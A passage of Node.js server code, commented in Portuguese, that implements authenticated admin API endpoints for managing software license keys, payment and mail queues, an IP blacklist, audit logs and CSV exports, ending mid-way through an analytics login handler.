    sendHtml(res, renderAdminDashboard({ portalUserCount: portalUsers.length, portalUsers, keysSnapshot })); return;
  }

  function extractCode(pattern) {
    const match = p.match(pattern);
    if (!match) return null;
    const code = decodeURIComponent(match[1]);
    if (!/^[a-z0-9_\-]{1,30}$/.test(code)) return null;
    return code;
  }
  const RA = R_ADMIN.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
  // Defesa CSRF uniforme para toda mutação administrativa autenticada.
  if (p.startsWith(R_ADMIN + '/api/') && !['GET','HEAD','OPTIONS'].includes(req.method) && !requireSameOriginPost(req)) {
    sendJson(res, { error: 'invalid_origin' }, 403); return;
  }

  if (p === R_ADMIN+'/api/traffic-summary' && req.method === 'GET') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const minutes = Math.max(5, Math.min(1440, parseInt(url.searchParams.get('minutes') || '60', 10) || 60));
    sendJson(res, { ok: true, ...httpTrafficSnapshot(minutes) }); return;
  }

  // /status — diagnóstico completo do servidor (admin-gated, substitui /health público)
  if (p === R_ADMIN+'/status' && req.method === 'GET') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const uptimeSec = Math.floor(process.uptime());
    let dbStatus = 'unknown';
    let caktoQueue = null, caktoMail = null;
    try {
      const _sdb = await getMongoDb();
      await _sdb.command({ ping: 1 });
      dbStatus = 'connected';
      try { caktoQueue = await getCaktoQueueHealth(_sdb); } catch { caktoQueue = null; }
      try { caktoMail = await getCaktoMailHealth(_sdb); } catch { caktoMail = null; }
    } catch { dbStatus = 'disconnected'; }
    sendJson(res, {
      ok: true, db: dbStatus, uptime: uptimeSec, ts: new Date().toISOString(),
      keys: Object.keys(keys).length, activeSessions: Object.keys(sessions).length,
      portalSessions: Object.keys(portalSessions).length,
      logs: logs.length, securityAlerts: securityAlerts.length,
      caktoQueue, caktoMail,
    }); return;
  }

  if (p === R_ADMIN+'/api/cakto-queue' && req.method === 'GET') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const allowed = new Set(['pending','retry','processing','dead_letter','processed','payment_duplicate']);
    const status = allowed.has(String(url.searchParams.get('status') || 'dead_letter')) ? String(url.searchParams.get('status') || 'dead_letter') : 'dead_letter';
    const limit = Math.max(1, Math.min(100, parseInt(url.searchParams.get('limit') || '50', 10) || 50));
    try {
      const db = await getMongoDb();
      await backfillCaktoQueueRefs(db, { limit: Math.max(100, limit * 2) });
      const rawRows = await db.collection('webhook_events').find({ source: 'cakto', status, queueRef: { $exists: true } }, {
        projection: { _id:0, queueRef:1, planId:1, status:1, attempts:1, failureCategory:1, createdAt:1, updatedAt:1, lastAttemptAt:1, nextAttemptAt:1, failedAt:1 }
      }).sort({ updatedAt: -1, createdAt: -1 }).limit(limit).toArray();
      const rows = [];
      for (const row of rawRows) {
        rows.push({ queueRef: row.queueRef, planId: row.planId || null, status: row.status, attempts: row.attempts || 0, failureCategory: row.failureCategory || null, createdAt: row.createdAt || null, updatedAt: row.updatedAt || null, lastAttemptAt: row.lastAttemptAt || null, nextAttemptAt: row.nextAttemptAt || null, failedAt: row.failedAt || null });
      }
      sendJson(res, { ok: true, status, items: rows });
    } catch (_) { sendJson(res, { ok: false, error: 'queue_unavailable' }, 503); }
    return;
  }
  if (p === R_ADMIN+'/api/cakto-queue/requeue' && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const body = await parseBody(req);
    const queueRef = safeScalar(body.queueRef, 64);
    try {
      const db = await getMongoDb();
      const result = await requeueCaktoEvent(db, queueRef);
      if (!result.ok) { sendJson(res, { ok: false, error: result.error }, result.error === 'invalid_queue_ref' ? 400 : 409); return; }
      addAdminAuditLog({ actor: 'admin', action: 'cakto_event_requeue', keyCode: '-', label: '-', detail: result.queueRef }).catch(()=>{});
      triggerCaktoWorker();
      sendJson(res, { ok: true, queueRef: result.queueRef });
    } catch (_) { sendJson(res, { ok: false, error: 'queue_unavailable' }, 503); }
    return;
  }

  if (p === R_ADMIN+'/api/cakto-mail' && req.method === 'GET') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const allowed = new Set(['pending','retry','processing','sent','dead_letter']);
    const status = allowed.has(String(url.searchParams.get('status') || 'dead_letter')) ? String(url.searchParams.get('status') || 'dead_letter') : 'dead_letter';
    const limit = Math.max(1, Math.min(100, parseInt(url.searchParams.get('limit') || '50', 10) || 50));
    try {
      const db = await getMongoDb();
      const rows = await db.collection('cakto_mail_outbox').find({ source: 'cakto', status }, {
        projection: { _id:0, mailRef:1, status:1, attempts:1, failureCategory:1, createdAt:1, updatedAt:1, lastAttemptAt:1, nextAttemptAt:1, failedAt:1, sentAt:1 }
      }).sort({ updatedAt: -1, createdAt: -1 }).limit(limit).toArray();
      sendJson(res, { ok: true, status, items: rows.map(row => ({ mailRef: row.mailRef, status: row.status, attempts: row.attempts || 0, failureCategory: row.failureCategory || null, createdAt: row.createdAt || null, updatedAt: row.updatedAt || null, lastAttemptAt: row.lastAttemptAt || null, nextAttemptAt: row.nextAttemptAt || null, failedAt: row.failedAt || null, sentAt: row.sentAt || null })) });
    } catch (_) { sendJson(res, { ok: false, error: 'mail_queue_unavailable' }, 503); }
    return;
  }
  if (p === R_ADMIN+'/api/cakto-mail/requeue' && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const body = await parseBody(req);
    const mailRef = safeScalar(body.mailRef, 64);
    try {
      const db = await getMongoDb();
      const result = await requeueCaktoMail(db, mailRef);
      if (!result.ok) { sendJson(res, { ok: false, error: result.error }, result.error === 'invalid_mail_ref' ? 400 : 409); return; }
      addAdminAuditLog({ actor: 'admin', action: 'cakto_mail_requeue', keyCode: '-', label: '-', detail: result.mailRef }).catch(()=>{});
      triggerCaktoWorker();
      sendJson(res, { ok: true, mailRef: result.mailRef });
    } catch (_) { sendJson(res, { ok: false, error: 'mail_queue_unavailable' }, 503); }
    return;
  }

  // ── IP Blacklist ──────────────────────────────────────────────────────────────
  if (p === R_ADMIN+'/api/ip-blacklist' && req.method === 'GET') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    try {
      const snapshot = await readAdminIpBlacklistSnapshot();
      replaceIpBlacklist(snapshot.ips);
      sendJson(res, { ok: true, ips: [...ipBlacklist] });
    } catch (e) {
      console.error('[ADMIN] Falha ao ler IP blacklist:', e.message);
      sendJson(res, { ok:false, error:'admin_ip_blacklist_unavailable', retryable:true }, 503);
    }
    return;
  }
  if ((p === R_ADMIN+'/api/ip-blacklist/add' || p === R_ADMIN+'/api/ip-blacklist/remove') && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    const body = await parseBody(req);
    const rawIp = typeof body?.ip === 'string' ? body.ip : '';
    const requestedIp = rawIp.length <= 80 ? normalizeClientIp(rawIp) : '';
    if (!requestedIp) { sendJson(res, { ok:false, error:'invalid_ip' }, 400); return; }
    const operation = p.endsWith('/add') ? 'add' : 'remove';
    // Um clique acidental não pode expulsar o administrador da própria rede.
    if (operation === 'add' && requestedIp === normalizeClientIp(ip)) {
      sendJson(res, { ok:false, error:'self_ip_block_forbidden' }, 409); return;
    }
    try {
      const result = await mutateAdminIpBlacklistStrict(operation, requestedIp);
      addAdminAuditLog({ actor:'admin', action: operation === 'add' ? 'ip_blacklist_add' : 'ip_blacklist_remove',
        keyCode:'-', label:'-', detail:result.ip }).catch(()=>{});
      sendJson(res, { ok:true, ips:result.ips }); return;
    } catch (e) {
      if (e?.code === 'ip_blacklist_limit') { sendJson(res, { ok:false, error:'ip_blacklist_limit' }, 409); return; }
      if (e?.code === 'ip_blacklist_conflict') { sendJson(res, { ok:false, error:'ip_blacklist_conflict', retryable:true }, 409); return; }
      console.error('[ADMIN] IP blacklist write/read:', e.message);
      sendJson(res, { ok:false, error:'admin_ip_blacklist_unavailable', retryable:true }, 503); return;
    }
  }

  // ── Exportar auditoria administrativa CSV ───────────────────────────────
  if (p === R_ADMIN+'/api/audit-logs/csv' && req.method === 'GET') {
    if (!isAdminSession(req)) { res.writeHead(401); res.end('Unauthorized'); return; }
    try {
      const db = await getMongoDb();
      const rows = await db.collection('admin_audit_logs').find({}).sort({ ts: -1 }).limit(5000).toArray();
      const esc = csvCell;
      const lines = ['Data,Ator,Ação,Chave,Cliente,Detalhe'];
      for (const r of rows) lines.push([esc(new Date(r.ts).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'})),esc(r.actor||'admin'),esc(r.action),esc(r.keyCode),esc(r.label),esc(r.detail)].join(','));
      const csv = lines.join('\r\n');
      res.setHeader('Content-Type', 'text/csv; charset=utf-8');
      res.setHeader('Content-Disposition', `attachment; filename="zvm-admin-audit-${new Date().toISOString().slice(0,10)}.csv"`);
      Object.entries(_SEC_HEADERS).forEach(([k,v]) => res.setHeader(k, v));
      res.writeHead(200); res.end('﻿' + csv);
    } catch (e) { sendJson(res, { error: 'audit_export_failed' }, 500); }
    return;
  }

  // ── Session info (para warning de expiração no frontend) ─────────────────────
  if (p === R_ADMIN+'/api/session-info' && req.method === 'GET') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const s = getAdminSession(req);
    sendJson(res, { ok: true, expiresAt: s?.expiresAt || null }); return;
  }

  if (p === R_ADMIN+'/api/data' && req.method === 'GET') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    let keysSnapshot;
    try { keysSnapshot = await readAdminKeysSnapshot(); }
    catch (e) {
      console.error('[ADMIN] /api/data leitura MongoDB:', e.message);
      sendJson(res, { ok:false, error:'admin_data_unavailable', retryable:true }, 503); return;
    }
    sendJson(res, {
      ...getKeyStats(keysSnapshot),
      keysHtml: buildKeysHtml(keysSnapshot),
      logsHtml: buildLogsHtml(),
    }); return;
  }

  if (p === R_ADMIN+'/api/portal-users' && req.method === 'GET') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const result = await loadAdminPortalUsers({ limit: 1000 });
    if (!result.ok) { sendJson(res, result, 503); return; }
    sendJson(res, result); return;
  }

  if (p === R_ADMIN+'/api/keys' && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    const body = await parseBody(req);
    const labelResult = normalizeAdminCreateLabel(body.label);
    if (!labelResult.ok) { sendJson(res, { error: labelResult.error }, 400); return; }
    const code = generateCode();
    const { expiresAt, expireDuration } = parseKeyExpiryFromBody(body, { allowMinutes: true });
    const maxUses = (body.maxUses !== undefined) ? parseInt(body.maxUses) : MAX_USES;
    const createdKey = {
      label: labelResult.label, active: true, createdAt: new Date().toISOString(),
      uses: 0, phones: [], lastUsed: null, lastIp: null, lastPhone: null,
      deviceId: null, wppVersion: null, note: '',
      expiresAt, expireDuration: expireDuration || null,
      maxUses: isNaN(maxUses) ? MAX_USES : maxUses, warnCount: 0,
      modules: { ...DEFAULT_MODULES, zapSaver: true },
    };
    try { await commitAdminKeyRecordStrict(code, createdKey); }
    catch (e) { sendAdminKeyPersistFailure(res, e, 'create key'); return; }
    addAdminAuditLog({ actor: 'admin', action: 'key_created', keyCode: code, label: keys[code].label }).catch(()=>{});
    sendJson(res, { ok: true, key: code }); return;
  }

  const codeToggle = extractCode(new RegExp(`^${RA}/api/keys/([^/]+)/toggle$`));
  if (codeToggle && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const k = await adminGetKey(codeToggle);
    if (!k) { sendJson(res, { error: 'not found' }, 404); return; }
    let savedToggle;
    try { savedToggle = await mutateAdminKeyRecordStrict(codeToggle, draft => { draft.active = !draft.active; }); }
    catch (e) { sendAdminKeyPersistFailure(res, e, 'toggle key'); return; }
    if (!savedToggle.active) fireWebhook('key_blocked', codeToggle, 'Bloqueio manual pelo admin');
    addAdminAuditLog({ actor: 'admin', action: savedToggle.active ? 'key_enabled' : 'key_disabled', keyCode: codeToggle, label: savedToggle.label }).catch(()=>{});
    sendJson(res, { ok: true, active: savedToggle.active }); return;
  }

  const codeDevAccess = extractCode(new RegExp(`^${RA}/api/keys/([^/]+)/dev-access$`));
  if (codeDevAccess && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    const kDevAccess = await adminGetKey(codeDevAccess);
    if (!kDevAccess) { sendJson(res, { error: 'not found' }, 404); return; }
    const body = await parseBody(req);
    if (typeof body.enabled !== 'boolean') { sendJson(res, { error: 'invalid_dev_access' }, 400); return; }
    let savedDevAccess;
    try { savedDevAccess = await setAdminKeyDevAccessStrict(codeDevAccess, body.enabled); }
    catch (e) { sendAdminKeyPersistFailure(res, e, 'dev-access'); return; }
    addAdminAuditLog({
      actor: 'admin',
      action: savedDevAccess.devAccess ? 'dev_access_enabled' : 'dev_access_disabled',
      keyCode: codeDevAccess,
      label: savedDevAccess.label,
      detail: savedDevAccess.devAccess ? 'DEV access enabled' : 'DEV access disabled',
    }).catch(()=>{});
    sendJson(res, { ok:true, devAccess:savedDevAccess.devAccess === true }); return;
  }

  const codeClearSuspect = extractCode(new RegExp(`^${RA}/api/keys/([^/]+)/clear-suspect$`));
  if (codeClearSuspect && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const kCs = await adminGetKey(codeClearSuspect);
    if (!kCs) { sendJson(res, { error: 'not found' }, 404); return; }
    let savedCs;
    try { savedCs = await mutateAdminKeyRecordStrict(codeClearSuspect, draft => { draft.suspectClearedAt = new Date().toISOString(); }); }
    catch (e) { sendAdminKeyPersistFailure(res, e, 'clear suspect'); return; }
    addAdminAuditLog({ actor: 'admin', action: 'suspect_cleared', keyCode: codeClearSuspect, label: savedCs.label }).catch(()=>{});
    sendJson(res, { ok: true }); return;
  }

  const codeRenew = extractCode(new RegExp(`^${RA}/api/keys/([^/]+)/renew$`));
  if (codeRenew && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const kRenew = await adminGetKey(codeRenew);
    if (!kRenew) { sendJson(res, { error: 'not found' }, 404); return; }
    const body = await parseBody(req);
    const days=Number(body.days ?? 0), hours=Number(body.hours ?? 0), mins=Number(body.mins ?? 0);
    const validParts = [days, hours, mins].every(n => Number.isSafeInteger(n) && n >= 0);
    const direction = body.direction === undefined ? 'add' : body.direction;
    const durationMinutes = days * 1440 + hours * 60 + mins;
    if (!validParts || !['add','remove'].includes(direction) ||
        !Number.isSafeInteger(durationMinutes) || durationMinutes <= 0 || durationMinutes > 5256000) {
      sendJson(res, { error: 'invalid_renewal_duration' }, 400); return;
    }
    const totalMinutes = direction === 'remove' ? -durationMinutes : durationMinutes;
    const operationId = body.operationId == null ? '' : String(body.operationId);
    let renewal;
    try {
      renewal = await renewAdminKeyAtomicStrict(codeRenew, totalMinutes, { operationId });
    } catch (e) {
      if (e?.message === 'invalid_renewal_operation_id') {
        sendJson(res, { ok:false, error:'invalid_renewal_operation_id' }, 400); return;
      }
      sendAdminKeyPersistFailure(res, e, 'renew key'); return;
    }
    if (!renewal) {
      sendJson(res, { ok:false, error:direction === 'remove' ?
        'cannot_remove_time' : 'not_found' }, direction === 'remove' ? 422 : 404); return;
    }
    const savedRenew = renewal.record;
    if (!renewal.replayed) {
      await addLog({ keyCode: codeRenew, label: savedRenew.label, phone: '-', ip, wppVersion: '-', action: 'renewed' });
      addAdminAuditLog({ actor: 'admin', action: direction === 'remove' ? 'key_time_removed' : 'key_renewed',
        keyCode: codeRenew, label: savedRenew.label,
        detail: `${direction === 'remove' ? '-' : '+'}${days}d${hours}h${mins}m` }).catch(()=>{});
    }
    sendJson(res, { ok: true, expiresAt: savedRenew.expiresAt, replayed: renewal.replayed,
      direction }); return;
  }

  const codeValidity = extractCode(new RegExp(`^${RA}/api/keys/([^/]+)/validity$`));
  if (codeValidity && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res,{error:'unauthorized'},401); return; }
    const change = parseAdminValidityChange(await parseBody(req));
    if (!change.ok) {sendJson(res,{ok:false,error:change.error},400);return;}
    let saved;
    try {
      saved = await mutateAdminKeyRecordStrict(codeValidity,draft=>{
        draft.expiresAt=change.expiresAt;
        draft.expireDuration=null;
        draft.warnEmailSent=false;
      });
    } catch(error) {sendAdminKeyPersistFailure(res,error,'edit validity');return;}
    if(!saved){sendJson(res,{ok:false,error:'not_found'},404);return;}
    addAdminAuditLog({actor:'admin',action:'key_validity_changed',keyCode:codeValidity,label:saved.label,
      detail:change.mode==='never'?'Sem expiração':'Validade definida explicitamente'}).catch(()=>{});
    sendJson(res,{ok:true,expiresAt:saved.expiresAt||null,mode:change.mode});return;
  }

  const codeMaxUses = extractCode(new RegExp(`^${RA}/api/keys/([^/]+)/max-uses$`));
  if (codeMaxUses && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const kMu = await adminGetKey(codeMaxUses);
    if (!kMu) { sendJson(res, { error: 'not found' }, 404); return; }
    const body = await parseBody(req);
    const rawMaxUses = body.maxUses;
    const maxUses = typeof rawMaxUses === 'number' ? rawMaxUses :
      (typeof rawMaxUses === 'string' && /^-?\d{1,5}$/.test(rawMaxUses) ? Number(rawMaxUses) : NaN);
    if (!Number.isSafeInteger(maxUses) || !(maxUses===-1 || (maxUses>=1 && maxUses<=10000))) {
      sendJson(res,{ok:false,error:'invalid_max_uses'},400);return;
    }
    let savedMu;
    try {
      savedMu = await mutateAdminKeyRecordStrict(codeMaxUses,draft=>{
        const linked=Array.isArray(draft.phones)?draft.phones.length:0;
        if(maxUses!==-1&&linked>maxUses)throw Object.assign(new Error('max_uses_below_linked_devices'),
          {code:'max_uses_below_linked_devices',linkedCount:linked});
        draft.maxUses=maxUses;
      });
    } catch(e) {
      if(e?.code==='max_uses_below_linked_devices'){
        sendJson(res,{ok:false,error:'max_uses_below_linked_devices',linkedCount:e.linkedCount},422);return;
      }
      sendAdminKeyPersistFailure(res,e,'max-uses');return;
    }
    if(!savedMu){sendJson(res,{ok:false,error:'not_found'},404);return;}
    addAdminAuditLog({ actor: 'admin', action: 'key_maxuses', keyCode: codeMaxUses, label: savedMu.label, detail: `maxUses=${maxUses}` }).catch(()=>{});
    sendJson(res, { ok: true, maxUses }); return;
  }

  const codeLabel = extractCode(new RegExp(`^${RA}/api/keys/([^/]+)/label$`));
  if (codeLabel && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const kLbl = await adminGetKey(codeLabel);
    if (!kLbl) { sendJson(res, { error: 'not found' }, 404); return; }
    const body  = await parseBody(req);
    const label = String(body.label||'').trim().slice(0, 60);
    if (!label) { sendJson(res, { error: 'label vazio' }, 400); return; }
    try { await mutateAdminKeyRecordStrict(codeLabel, draft => { draft.label = label; }); }
    catch (e) { sendAdminKeyPersistFailure(res, e, 'label'); return; }
    addAdminAuditLog({ actor: 'admin', action: 'key_renamed', keyCode: codeLabel, label, detail: `→ ${label}` }).catch(()=>{});
    sendJson(res, { ok: true, label }); return;
  }

  const codePhonesGet = extractCode(new RegExp(`^${RA}/api/keys/([^/]+)/phones$`));
  if (codePhonesGet && req.method === 'GET') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const kPh = await adminGetKey(codePhonesGet);
    if (!kPh) { sendJson(res, { error: 'not found' }, 404); return; }
    sendJson(res, { ok: true, phones: kPh.phones || [] }); return;
  }

  const codePhonesDelete = extractCode(new RegExp(`^${RA}/api/keys/([^/]+)/phones$`));
  if (codePhonesDelete && req.method === 'DELETE') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const kPhDel = await adminGetKey(codePhonesDelete);
    if (!kPhDel) { sendJson(res, { error: 'not found' }, 404); return; }
    const body = await parseBody(req);
    let savedPhones;
    try { savedPhones = await mutateAdminKeyRecordStrict(codePhonesDelete, draft => {
      if (body.all) clearAllPhonesFromKey(draft);
      else if (body.phone) removePhoneFromKey(draft, body.phone);
      else throw Object.assign(new Error('invalid_phone_delete'), { code:'invalid_phone_delete' });
    }); }
    catch (e) {
      if (e.code === 'invalid_phone_delete') { sendJson(res, { error: 'informe phone ou all:true' }, 400); return; }
      sendAdminKeyPersistFailure(res, e, 'phones'); return;
    }
    sendJson(res, { ok: true, phones: savedPhones.phones }); return;
  }

  const codeResetWarn = extractCode(new RegExp(`^${RA}/api/keys/([^/]+)/reset-warn$`));
  if (codeResetWarn && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const kRw = await adminGetKey(codeResetWarn);
    if (!kRw) { sendJson(res, { error: 'not found' }, 404); return; }
    try { await mutateAdminKeyRecordStrict(codeResetWarn, draft => { draft.warnCount = 0; }); }
    catch (e) { sendAdminKeyPersistFailure(res, e, 'reset warn'); return; }
    sendJson(res, { ok: true }); return;
  }

  if (p === R_ADMIN+'/api/keys/batch' && req.method === 'DELETE') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    const body = await parseBody(req);
    const batchInput = parseAdminBatchDeleteCodes(body);
    if (!batchInput.ok) { sendJson(res, { error: batchInput.error }, 400); return; }
    let canonicalKeys;
    try { canonicalKeys = await readAdminKeysSnapshot(); }
    catch (e) { sendAdminKeyPersistFailure(res, e, 'read batch keys'); return; }
    // Se uma chave já não existe no banco, não excluir as outras inadvertidamente.
    const missing = batchInput.codes.filter(code => !Object.prototype.hasOwnProperty.call(canonicalKeys, code));
    if (missing.length) {
      sendJson(res, { ok:false, error:'key_write_conflict', retryable:true, deleted:0 }, 409); return;
    }
    let deleted;
    try { deleted = await deleteKeysFromDbStrict(batchInput.codes); }
    catch (e) { sendAdminKeyPersistFailure(res, e, 'batch delete'); return; }
    addAdminAuditLog({ actor: 'admin', action: 'key_batch_deleted', keyCode: '-', label: '-', detail: `${deleted} chave(s): ${batchInput.codes.slice(0,5).map(maskLicenseCode).join(', ')}` }).catch(()=>{});
    sendJson(res, { ok: true, deleted }); return;
  }

  const codeNote = extractCode(new RegExp(`^${RA}/api/keys/([^/]+)/note$`));
  if (codeNote && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const kNote = await adminGetKey(codeNote);
    if (!kNote) { sendJson(res, { error: 'not found' }, 404); return; }
    const body = await parseBody(req);
    const note = String(body.note||'').slice(0, 500);
    try { await mutateAdminKeyRecordStrict(codeNote, draft => { draft.note = note; }); }
    catch (e) { sendAdminKeyPersistFailure(res, e, 'note'); return; }
    sendJson(res, { ok: true }); return;
  }



  const codeDelete = extractCode(new RegExp(`^${RA}/api/keys/([^/]+)$`));
  if (codeDelete && req.method === 'DELETE') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    let current;
    try { current = await readAdminKeySnapshot(codeDelete); }
    catch(e) { sendAdminKeyPersistFailure(res, e, 'read delete key'); return; }
    if (!current) { sendJson(res, { error:'not_found' }, 404); return; }
    try { await deleteKeyFromDb(codeDelete); }
    catch(e) { sendAdminKeyPersistFailure(res, e, 'delete key'); return; }
    addAdminAuditLog({ actor: 'admin', action: 'key_deleted', keyCode: codeDelete, label: current.label || '' }).catch(()=>{});
    sendJson(res, { ok: true }); return;
  }

  if (p === R_ADMIN+'/api/logs' && req.method === 'DELETE') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    if (!requireSameOriginPost(req)) { sendJson(res, { error: 'invalid_origin' }, 403); return; }
    const body = await parseBody(req);
    if (body.date !== undefined) {
      // Valida formato estritamente: YYYY-MM-DD (10 chars). String vazia ou objeto
      // causariam startsWith("") == true deletando TUDO, ou TypeError em null.date.
      const dateStr = typeof body.date === 'string' ? body.date : '';
      if (!/^\d{4}-\d{2}-\d{2}$/.test(dateStr)) {
        sendJson(res, { error: 'date inválida — use YYYY-MM-DD' }, 400); return;
      }
      // Converte o prefixo de data para UTC compensando o fuso de exibição (BRT = UTC-3).
      // Logs são gravados em UTC; o admin vê em São Paulo. O filtro precisa cobrir
      // o dia completo em BRT: das 03:00 UTC do dia até 03:00 UTC do dia seguinte.
      const dayStartUTC = new Date(dateStr + 'T03:00:00.000Z');
      const dayEndUTC   = new Date(dayStartUTC.getTime() + 24 * 60 * 60 * 1000);
      logs = logs.filter(l => {
        if (typeof l.timestamp !== 'string') return true; // preserva entradas sem timestamp
        const t = new Date(l.timestamp);
        return isNaN(t) || t < dayStartUTC || t >= dayEndUTC;
      });
    } else {
      logs = [];
    }
    await saveLogs();
    sendJson(res, { ok: true, remaining: logs.length }); return;
  }



  if (p === R_ADMIN+'/api/logs' && req.method === 'GET') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const dateParam = url.searchParams.get('date') || '';
    const q         = (url.searchParams.get('q') || '').toLowerCase().slice(0, 100);

    let filtered = logs;
    if (dateParam) {
      if (!/^\d{4}-\d{2}-\d{2}$/.test(dateParam)) {
        sendJson(res, { error: 'date inválida — use YYYY-MM-DD' }, 400); return;
      }
      // Filtra pelo dia completo em BRT (UTC-3): cobre 03:00 UTC do dia até 03:00 UTC do próximo
      const dayStartUTC = new Date(dateParam + 'T03:00:00.000Z');
      const dayEndUTC   = new Date(dayStartUTC.getTime() + 24 * 60 * 60 * 1000);
      filtered = logs.filter(l => {
        if (typeof l.timestamp !== 'string') return false;
        const t = new Date(l.timestamp);
        return !isNaN(t) && t >= dayStartUTC && t < dayEndUTC;
      });
    }
    if (q) {
      filtered = filtered.filter(l =>
        (l.keyCode||'').toLowerCase().includes(q) ||
        (l.ip||'').toLowerCase().includes(q) ||
        (l.phone||'').toLowerCase().includes(q) ||
        (l.label||'').toLowerCase().includes(q)
      );
    }
    sendJson(res, { ok: true, logsHtml: buildLogsHtml(filtered) }); return;
  }

  const codeModules = extractCode(new RegExp(`^${RA}/api/keys/([^/]+)/modules$`));
  if (codeModules && req.method === 'POST') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    const kMod = await adminGetKey(codeModules);
    if (!kMod) { sendJson(res, { error: 'not found' }, 404); return; }
    const body = await parseBody(req);
    const moduleRaw  = String(body.module || '').slice(0, 20);
    // Resolve case-insensitively to the canonical name stored in AVAILABLE_MODULES
    const moduleName = AVAILABLE_MODULES.find(m => m.toLowerCase() === moduleRaw.toLowerCase()) || '';
    const enabled    = !!body.enabled;
    if (!moduleName) { sendJson(res, { error: 'modulo_invalido', module: moduleRaw }, 400); return; }
    let savedMod;
    try { savedMod = await mutateAdminKeyRecordStrict(codeModules, draft => {
      if (!draft.modules) draft.modules = { ...DEFAULT_MODULES };
      draft.modules[moduleName] = enabled;
    }); }
    catch (e) { sendAdminKeyPersistFailure(res, e, 'module'); return; }
    sendJson(res, { ok: true, module: moduleName, enabled, modules: savedMod.modules }); return;
  }

  if (p === R_ADMIN+'/api/export/csv' && req.method === 'GET') {
    if (!isAdminSession(req)) { sendJson(res, { error: 'unauthorized' }, 401); return; }
    let snapshot;
    try { snapshot = await readAdminKeysSnapshot(); }
    catch (e) { sendJson(res, { ok:false, error:'admin_data_unavailable', retryable:true }, 503); return; }
    const header = 'Chave,Cliente,Status,Validade,Usos,Telefone,Último IP,Último Acesso,Criada em,Expira em,ZapSaver,Nota';
    const rows = Object.entries(snapshot).map(([code, k]) => {
      const stLabel = getKeyDisplayStatus(k).toUpperCase();
      const cols = [
        code, k.label, stLabel,
        k.expiresAt ? new Date(k.expiresAt).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'}) : (k.expireDuration ? 'Ao 1º uso' : 'Sem expiração'),
        `${(k.phones||[]).length}/${k.maxUses===-1?'Ilimitado':(k.maxUses>0?k.maxUses:MAX_USES)}`,
        k.lastPhone||'', k.lastIp||'',
        k.lastUsed ? new Date(k.lastUsed).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'}) : '',
        new Date(k.createdAt||Date.now()).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'}),
        k.expiresAt ? new Date(k.expiresAt).toLocaleString('pt-BR',{timeZone:'America/Sao_Paulo'}) : 'Sem expiração',
        (k.modules && k.modules.zapSaver) ? 'SIM' : 'NAO',
        (k.note||'').replace(/,/g,';')
      ];
      return cols.map(csvCell).join(',');
    });
    const csv = [header, ...rows].join('\r\n');
    Object.entries(_SEC_HEADERS).forEach(([key,value]) => res.setHeader(key,value));
    res.setHeader('Cache-Control', 'no-store');
    res.setHeader('Content-Type', 'text/csv; charset=utf-8');
    res.setHeader('Content-Disposition', `attachment; filename="zvm-chaves-${new Date().toISOString().slice(0,10)}.csv"`);
    res.writeHead(200); res.end('\uFEFF' + csv); return;
  }

  if (p === R_ANALYTICS+'/login' && req.method === 'POST') {
    if (!requireSameOriginPost(req)) { sendHtml(res, 'Forbidden', 403); return; }
    if (!ANALYTICS_PASS) { res.writeHead(404); res.end('Not found'); return; }
    if (!checkRateLimit(ip, 'login')) {
      const mins = getRateLimitWait(ip, 'login');
